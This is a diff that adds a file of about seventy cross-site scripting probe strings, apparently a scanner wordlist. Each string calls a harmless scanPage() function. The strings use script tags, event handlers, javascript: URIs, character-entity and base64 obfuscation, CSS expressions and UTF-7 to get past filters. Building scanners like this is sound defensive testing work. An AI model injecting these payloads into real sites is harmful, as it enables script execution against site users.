@@ -1,0 +1,70 @@
+<script>scanPage();</script>
+"onmouseover="scanPage()"a="
+'onmouseover='scanPage()'a='
+'%20onmouseover=scanPage()'
+%22%20onmouseover=javascript:scanPage()%20%22
+javascript:scanPage()
+\');scanPage();//
+);scanPage();//
+%26%2339;-scanPage()//
+%22);scanPage();//
+%E0<body onload=scanPage()>
+%00<body onload=scanPage()>
+xss'%20scanPage()%2F%2F
+xss%22%20scanPage()%2F%2F
+%5C%5C'%2BscanPage()%3B%2F%2F
+%3Cscript%3EscanPage()%3B%3C%2Fscript%3E
+scanPage()%3B
+');scanPage();//
+%3Cscript%3Ea%3D%2FXSS%2F
+scanPage()%3C%2Fscript%3E
+%22%3E%3Cscript%3EscanPage()%3B%3C%2Fscript%3E
+xss%20-%22%3E%3Cscript%3EscanPage()%3C%2Fscript%3E
+xss%20%3Cscript%3EscanPage()%3B%3C%2Fscript%3E
+<SCRIPT>scanPage();</SCRIPT>
+'';!--"<XSS>=&{()}
+<IMG SRC="javascript:scanPage();">
+<IMG SRC=javascript:scanPage()>
+<IMG SRC=JaVaScRiPt:scanPage()>
+<IMG SRC=javascript:eval(String.fromCharCode(115, 99, 97, 110, 80, 97, 103, 101, 40, 41))>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#115;&#99;&#97;&#110;&#80;&#97;&#103;&#101;&#40;&#41;>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000115&#0000099&#0000097&#0000110&#0000080&#0000097&#0000103&#0000101&#0000040&#0000041>
+<IMG SRC=&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3a&#x73&#x63&#x61&#x6e&#x50&#x61&#x67&#x65&#x28&#x29>
+<IMG SRC="jav	ascript:scanPage();">
+<IMG SRC="jav&#x09;ascript:scanPage();">
+<IMG SRC="jav&#x0A;ascript:scanPage();">
+<IMG SRC="jav&#x0D;ascript:scanPage();">
+<IMG SRC=" &#14;  javascript:scanPage();">
+<SCRIPT>a=/XSS/
+\";scanPage();//
+<INPUT TYPE="IMAGE" SRC="javascript:scanPage();">
+<BODY BACKGROUND="javascript:scanPage()">
+<BODY ONLOAD=scanPage()>
+<IMG DYNSRC="javascript:scanPage()">
+<IMG LOWSRC="javascript:scanPage()">
+<BGSOUND SRC="javascript:scanPage();">
+<BR SIZE="&{scanPage()}">
+<LINK REL="stylesheet" HREF="javascript:scanPage();">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:scanPage();">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5zY2FuUGFnZSgpPC9zY3JpcHQ+DQo=">
+<META HTTP-EQUIV="Link" Content="<javascript:scanPage()>; REL=stylesheet">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:scanPage();">
+<IFRAME SRC="javascript:scanPage();"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:scanPage();"></FRAMESET>
+<TABLE BACKGROUND="javascript:scanPage()">
+<DIV STYLE="background-image: url(javascript:scanPage())">
+<DIV STYLE="background-image: url(&#1;javascript:scanPage())">
+<DIV STYLE="width: expression(scanPage());">
+<STYLE>@im\port'\ja\vasc\ript:scanPage()';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(scanPage())">
+<XSS STYLE="xss:expression(scanPage())">
+exp/*<XSS STYLE='no\xss:noxss("*//*");
+<STYLE TYPE="text/javascript">scanPage();</STYLE>
+<STYLE>.XSS{background-image:url("javascript:scanPage()");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:scanPage()")}</STYLE>
+<BASE HREF="javascript:scanPage();//">
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=scanPage()></OBJECT>
+<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas<![CDATA[cript:scanPage();">
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;scanPage()&lt;/SCRIPT&gt;">
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-scanPage();+ADw-/SCRIPT+AD4-
+<img src=a onerror=scanPage() %0A>
